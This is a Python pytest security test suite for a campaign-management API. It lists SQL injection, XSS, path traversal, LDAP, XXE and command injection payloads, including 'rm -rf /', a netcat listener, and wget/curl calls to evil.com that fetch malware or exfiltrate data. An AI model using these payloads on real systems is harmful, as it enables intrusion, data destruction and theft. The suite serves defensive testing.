"""
Comprehensive Security Tests for OmniFy Cloud Connect
Authentication, authorization, input validation, and security vulnerability testing
"""

import pytest
import asyncio
import json
import base64
import hashlib
import hmac
from typing import Dict, List, Any, Optional
from datetime import datetime, timedelta
import httpx
import re

from tests.conftest import test_client, test_user_token

class TestAuthenticationSecurity:
    """Authentication security tests"""
    
    @pytest.mark.asyncio
    async def test_jwt_token_security(self, test_client):
        """Test JWT token security"""
        
        # Test 1: Invalid token format
        invalid_tokens = [
            "invalid_token",
            "Bearer invalid_token",
            "Bearer ",
            "",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature"
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": token}
            response = await test_client.get("/campaigns", headers=headers)
            assert response.status_code == 401, f"Invalid token {token} should return 401"
        
        # Test 2: Expired token
        expired_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0QHVzZXIuY29tIiwiZXhwIjoxNjAwMDAwMDAwfQ.expired_signature"
        headers = {"Authorization": f"Bearer {expired_token}"}
        response = await test_client.get("/campaigns", headers=headers)
        assert response.status_code == 401
        
        # Test 3: Token without required claims
        incomplete_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0QHVzZXIuY29tIn0.incomplete_signature"
        headers = {"Authorization": f"Bearer {incomplete_token}"}
        response = await test_client.get("/campaigns", headers=headers)
        assert response.status_code == 401
    
    @pytest.mark.asyncio
    async def test_password_security(self, test_client):
        """Test password security requirements"""
        
        # Test weak passwords
        weak_passwords = [
            "123456",
            "password",
            "admin",
            "qwerty",
            "abc123",
            "Password123",  # Common pattern
            "1234567890",
            "abcdefgh"
        ]
        
        for password in weak_passwords:
            registration_data = {
                "email": f"test_{password}@example.com",
                "password": password,
                "name": "Test User"
            }
            
            response = await test_client.post("/auth/register", json=registration_data)
            assert response.status_code == 422, f"Weak password {password} should be rejected"
        
        # Test strong password acceptance
        strong_password = "Str0ng!P@ssw0rd#2024"
        registration_data = {
            "email": "test_strong@example.com",
            "password": strong_password,
            "name": "Test User"
        }
        
        response = await test_client.post("/auth/register", json=registration_data)
        assert response.status_code == 201, "Strong password should be accepted"
    
    @pytest.mark.asyncio
    async def test_brute_force_protection(self, test_client):
        """Test brute force attack protection"""
        
        # Attempt multiple failed logins
        failed_attempts = 0
        for i in range(10):
            login_data = {
                "email": "test@example.com",
                "password": f"wrong_password_{i}"
            }
            
            response = await test_client.post("/auth/login", json=login_data)
            
            if response.status_code == 401:
                failed_attempts += 1
            elif response.status_code == 429:  # Rate limited
                break
        
        # Should be rate limited after multiple failed attempts
        assert failed_attempts >= 5, "Should allow some failed attempts before rate limiting"
        
        # Test rate limiting response
        login_data = {"email": "test@example.com", "password": "wrong_password"}
        response = await test_client.post("/auth/login", json=login_data)
        
        if response.status_code == 429:
            rate_limit_data = response.json()
            assert "retry_after" in rate_limit_data
            assert rate_limit_data["retry_after"] > 0
    
    @pytest.mark.asyncio
    async def test_session_security(self, test_client, test_user_token):
        """Test session security"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Test session timeout
        # This would require implementing session timeout logic
        
        # Test concurrent sessions
        # Create multiple sessions with same credentials
        sessions = []
        for i in range(5):
            login_data = {
                "email": "test@example.com",
                "password": "testpassword123"
            }
            
            response = await test_client.post("/auth/login", json=login_data)
            if response.status_code == 200:
                sessions.append(response.json()["access_token"])
        
        # All sessions should work
        for token in sessions:
            session_headers = {"Authorization": f"Bearer {token}"}
            response = await test_client.get("/campaigns", headers=session_headers)
            assert response.status_code == 200

class TestAuthorizationSecurity:
    """Authorization security tests"""
    
    @pytest.mark.asyncio
    async def test_role_based_access_control(self, test_client, test_user_token):
        """Test role-based access control"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Test admin-only endpoints
        admin_endpoints = [
            "/admin/users",
            "/admin/settings",
            "/admin/analytics",
            "/admin/integrations"
        ]
        
        for endpoint in admin_endpoints:
            response = await test_client.get(endpoint, headers=headers)
            # Should return 403 for non-admin users
            assert response.status_code in [403, 404], f"Non-admin user should not access {endpoint}"
        
        # Test user-specific resource access
        # Create a resource as one user
        campaign_data = {
            "name": "Security Test Campaign",
            "platform": "google_ads",
            "budget": 1000.0
        }
        
        create_response = await test_client.post("/campaigns/create", 
            headers=headers,
            json=campaign_data
        )
        assert create_response.status_code == 201
        campaign_id = create_response.json()["campaign_id"]
        
        # Try to access with different user token (if available)
        # This would require creating another user token
        
        # Test resource ownership
        get_response = await test_client.get(f"/campaigns/{campaign_id}", headers=headers)
        assert get_response.status_code == 200
        
        campaign = get_response.json()
        assert campaign["campaign_id"] == campaign_id
    
    @pytest.mark.asyncio
    async def test_api_endpoint_authorization(self, test_client, test_user_token):
        """Test API endpoint authorization"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Test unauthorized access to sensitive endpoints
        sensitive_endpoints = [
            ("GET", "/admin/users"),
            ("POST", "/admin/users/create"),
            ("DELETE", "/admin/users/123"),
            ("GET", "/admin/settings"),
            ("PUT", "/admin/settings"),
            ("GET", "/admin/audit-logs"),
            ("POST", "/admin/system/restart"),
            ("DELETE", "/admin/system/reset")
        ]
        
        for method, endpoint in sensitive_endpoints:
            if method == "GET":
                response = await test_client.get(endpoint, headers=headers)
            elif method == "POST":
                response = await test_client.post(endpoint, headers=headers, json={})
            elif method == "PUT":
                response = await test_client.put(endpoint, headers=headers, json={})
            elif method == "DELETE":
                response = await test_client.delete(endpoint, headers=headers)
            
            # Should return 403 or 404 for unauthorized access
            assert response.status_code in [403, 404], f"Unauthorized access to {method} {endpoint} should be blocked"
    
    @pytest.mark.asyncio
    async def test_resource_isolation(self, test_client, test_user_token):
        """Test resource isolation between users/organizations"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Create resources
        campaign_data = {
            "name": "Isolation Test Campaign",
            "platform": "google_ads",
            "budget": 1000.0
        }
        
        create_response = await test_client.post("/campaigns/create", 
            headers=headers,
            json=campaign_data
        )
        campaign_id = create_response.json()["campaign_id"]
        
        # Test that user can only access their own resources
        get_response = await test_client.get(f"/campaigns/{campaign_id}", headers=headers)
        assert get_response.status_code == 200
        
        # Test access to non-existent resource
        fake_campaign_id = "000000000000000000000000"
        fake_response = await test_client.get(f"/campaigns/{fake_campaign_id}", headers=headers)
        assert fake_response.status_code == 404

class TestInputValidationSecurity:
    """Input validation security tests"""
    
    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self, test_client, test_user_token):
        """Test SQL injection prevention"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # SQL injection payloads
        sql_injection_payloads = [
            "'; DROP TABLE campaigns; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO campaigns VALUES ('hacked', 999999); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "' AND id IS NULL; UPDATE campaigns SET budget=999999; --"
        ]
        
        for payload in sql_injection_payloads:
            # Test in campaign name
            campaign_data = {
                "name": payload,
                "platform": "google_ads",
                "budget": 1000.0
            }
            
            response = await test_client.post("/campaigns/create", 
                headers=headers,
                json=campaign_data
            )
            
            # Should either reject the input or sanitize it
            assert response.status_code in [201, 422], f"SQL injection payload should be handled safely: {payload}"
            
            if response.status_code == 201:
                # If accepted, verify the data was sanitized
                campaign_id = response.json()["campaign_id"]
                get_response = await test_client.get(f"/campaigns/{campaign_id}", headers=headers)
                campaign = get_response.json()
                
                # Verify no SQL commands in the stored data
                assert "DROP" not in campaign["name"].upper()
                assert "UNION" not in campaign["name"].upper()
                assert "INSERT" not in campaign["name"].upper()
                assert "UPDATE" not in campaign["name"].upper()
    
    @pytest.mark.asyncio
    async def test_xss_prevention(self, test_client, test_user_token):
        """Test XSS prevention"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            # Test in campaign description
            campaign_data = {
                "name": "XSS Test Campaign",
                "platform": "google_ads",
                "budget": 1000.0,
                "description": payload
            }
            
            response = await test_client.post("/campaigns/create", 
                headers=headers,
                json=campaign_data
            )
            
            if response.status_code == 201:
                campaign_id = response.json()["campaign_id"]
                get_response = await test_client.get(f"/campaigns/{campaign_id}", headers=headers)
                campaign = get_response.json()
                
                # Verify XSS payloads are sanitized
                description = campaign.get("description", "")
                assert "<script>" not in description.lower()
                assert "javascript:" not in description.lower()
                assert "onerror=" not in description.lower()
                assert "onload=" not in description.lower()
                assert "onfocus=" not in description.lower()
    
    @pytest.mark.asyncio
    async def test_input_length_validation(self, test_client, test_user_token):
        """Test input length validation"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Test extremely long inputs
        long_string = "x" * 10000  # 10KB string
        
        campaign_data = {
            "name": long_string,
            "platform": "google_ads",
            "budget": 1000.0,
            "description": long_string
        }
        
        response = await test_client.post("/campaigns/create", 
            headers=headers,
            json=campaign_data
        )
        
        # Should reject or truncate extremely long inputs
        assert response.status_code in [201, 422], "Extremely long inputs should be handled safely"
        
        if response.status_code == 201:
            campaign_id = response.json()["campaign_id"]
            get_response = await test_client.get(f"/campaigns/{campaign_id}", headers=headers)
            campaign = get_response.json()
            
            # Verify inputs were truncated to reasonable lengths
            assert len(campaign["name"]) < 1000, "Campaign name should be truncated"
            assert len(campaign.get("description", "")) < 5000, "Description should be truncated"
    
    @pytest.mark.asyncio
    async def test_data_type_validation(self, test_client, test_user_token):
        """Test data type validation"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Test invalid data types
        invalid_data_tests = [
            {
                "name": 123,  # Should be string
                "platform": "google_ads",
                "budget": 1000.0
            },
            {
                "name": "Test Campaign",
                "platform": 456,  # Should be string
                "budget": 1000.0
            },
            {
                "name": "Test Campaign",
                "platform": "google_ads",
                "budget": "invalid_budget"  # Should be number
            },
            {
                "name": "Test Campaign",
                "platform": "google_ads",
                "budget": None  # Should not be null
            },
            {
                "name": "Test Campaign",
                "platform": "google_ads",
                "budget": [1000, 2000]  # Should not be array
            }
        ]
        
        for invalid_data in invalid_data_tests:
            response = await test_client.post("/campaigns/create", 
                headers=headers,
                json=invalid_data
            )
            
            # Should reject invalid data types
            assert response.status_code == 422, f"Invalid data type should be rejected: {invalid_data}"

class TestSecurityVulnerabilities:
    """Security vulnerability tests"""
    
    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, test_client, test_user_token):
        """Test path traversal attack prevention"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Path traversal payloads
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test in file upload
            files = {"file": ("test.txt", b"test content", "text/plain")}
            response = await test_client.post(f"/files/upload?path={payload}", 
                headers=headers,
                files=files
            )
            
            # Should reject path traversal attempts
            assert response.status_code in [400, 403, 422], f"Path traversal should be blocked: {payload}"
    
    @pytest.mark.asyncio
    async def test_command_injection_prevention(self, test_client, test_user_token):
        """Test command injection prevention"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Command injection payloads
        command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; rm -rf /",
            "| nc -l -p 1234",
            "&& wget http://evil.com/malware",
            "; curl http://evil.com/steal",
            "`curl http://evil.com/steal`"
        ]
        
        for payload in command_injection_payloads:
            # Test in system commands
            system_data = {
                "command": f"echo {payload}",
                "parameters": {"input": payload}
            }
            
            response = await test_client.post("/system/execute", 
                headers=headers,
                json=system_data
            )
            
            # Should reject command injection attempts
            assert response.status_code in [400, 403, 422], f"Command injection should be blocked: {payload}"
    
    @pytest.mark.asyncio
    async def test_ldap_injection_prevention(self, test_client, test_user_token):
        """Test LDAP injection prevention"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # LDAP injection payloads
        ldap_injection_payloads = [
            "*",
            "*)(&",
            "*)(|",
            "*)(!",
            "*)(&(objectClass=*",
            "*)(|(objectClass=*",
            "*)(!objectClass=*",
            "admin*",
            "*admin",
            "*)(uid=*",
            "*)(cn=*"
        ]
        
        for payload in ldap_injection_payloads:
            # Test in user search
            search_data = {
                "query": payload,
                "search_type": "user"
            }
            
            response = await test_client.post("/users/search", 
                headers=headers,
                json=search_data
            )
            
            # Should handle LDAP injection safely
            assert response.status_code in [200, 400, 422], f"LDAP injection should be handled safely: {payload}"
    
    @pytest.mark.asyncio
    async def test_xml_external_entity_prevention(self, test_client, test_user_token):
        """Test XML External Entity (XXE) prevention"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # XXE payloads
        xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>'
        ]
        
        for payload in xxe_payloads:
            # Test XML processing
            xml_data = {
                "xml_content": payload,
                "processing_type": "parse"
            }
            
            response = await test_client.post("/xml/process", 
                headers=headers,
                json=xml_data
            )
            
            # Should reject XXE attempts
            assert response.status_code in [400, 403, 422], f"XXE should be blocked: {payload[:50]}..."
    
    @pytest.mark.asyncio
    async def test_csrf_protection(self, test_client, test_user_token):
        """Test CSRF protection"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Test CSRF token requirement for state-changing operations
        state_changing_endpoints = [
            ("POST", "/campaigns/create"),
            ("PUT", "/campaigns/123"),
            ("DELETE", "/campaigns/123"),
            ("POST", "/users/create"),
            ("PUT", "/users/123"),
            ("DELETE", "/users/123")
        ]
        
        for method, endpoint in state_changing_endpoints:
            # Test without CSRF token
            if method == "POST":
                response = await test_client.post(endpoint, 
                    headers=headers,
                    json={"test": "data"}
                )
            elif method == "PUT":
                response = await test_client.put(endpoint, 
                    headers=headers,
                    json={"test": "data"}
                )
            elif method == "DELETE":
                response = await test_client.delete(endpoint, headers=headers)
            
            # Should require CSRF token for state-changing operations
            # Note: This depends on CSRF protection implementation
            assert response.status_code in [200, 201, 403, 404, 422], f"CSRF protection should be in place for {method} {endpoint}"

class TestDataSecurity:
    """Data security tests"""
    
    @pytest.mark.asyncio
    async def test_data_encryption(self, test_client, test_user_token):
        """Test data encryption at rest and in transit"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Test sensitive data handling
        sensitive_data = {
            "name": "Encryption Test Campaign",
            "platform": "google_ads",
            "budget": 1000.0,
            "api_key": "sensitive_api_key_12345",
            "password": "sensitive_password_67890",
            "credit_card": "4111-1111-1111-1111"
        }
        
        response = await test_client.post("/campaigns/create", 
            headers=headers,
            json=sensitive_data
        )
        
        if response.status_code == 201:
            campaign_id = response.json()["campaign_id"]
            get_response = await test_client.get(f"/campaigns/{campaign_id}", headers=headers)
            campaign = get_response.json()
            
            # Verify sensitive data is not stored in plain text
            assert campaign.get("api_key") != "sensitive_api_key_12345", "API key should be encrypted"
            assert campaign.get("password") != "sensitive_password_67890", "Password should be encrypted"
            assert campaign.get("credit_card") != "4111-1111-1111-1111", "Credit card should be encrypted"
    
    @pytest.mark.asyncio
    async def test_data_anonymization(self, test_client, test_user_token):
        """Test data anonymization for privacy"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Test PII data handling
        pii_data = {
            "name": "John Doe",
            "email": "john.doe@example.com",
            "phone": "+1-555-123-4567",
            "ssn": "123-45-6789",
            "address": "123 Main St, Anytown, USA"
        }
        
        response = await test_client.post("/users/profile", 
            headers=headers,
            json=pii_data
        )
        
        if response.status_code == 201:
            user_id = response.json()["user_id"]
            get_response = await test_client.get(f"/users/{user_id}", headers=headers)
            user = get_response.json()
            
            # Verify PII is anonymized or masked
            assert user.get("ssn") != "123-45-6789", "SSN should be anonymized"
            assert user.get("phone") != "+1-555-123-4567", "Phone should be anonymized"
    
    @pytest.mark.asyncio
    async def test_audit_logging(self, test_client, test_user_token):
        """Test audit logging for security events"""
        headers = {"Authorization": f"Bearer {test_user_token}"}
        
        # Perform various actions that should be logged
        actions = [
            ("POST", "/campaigns/create", {"name": "Audit Test Campaign", "platform": "google_ads", "budget": 1000.0}),
            ("GET", "/campaigns", {}),
            ("PUT", "/campaigns/123", {"name": "Updated Campaign"}),
            ("DELETE", "/campaigns/123", {})
        ]
        
        for method, endpoint, data in actions:
            if method == "POST":
                response = await test_client.post(endpoint, headers=headers, json=data)
            elif method == "GET":
                response = await test_client.get(endpoint, headers=headers)
            elif method == "PUT":
                response = await test_client.put(endpoint, headers=headers, json=data)
            elif method == "DELETE":
                response = await test_client.delete(endpoint, headers=headers)
        
        # Check audit logs
        audit_response = await test_client.get("/audit/logs", headers=headers)
        
        if audit_response.status_code == 200:
            audit_logs = audit_response.json()
            assert len(audit_logs) > 0, "Audit logs should be generated"
            
            # Verify log entries contain required information
            for log_entry in audit_logs:
                assert "timestamp" in log_entry
                assert "user_id" in log_entry
                assert "action" in log_entry
                assert "resource" in log_entry

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
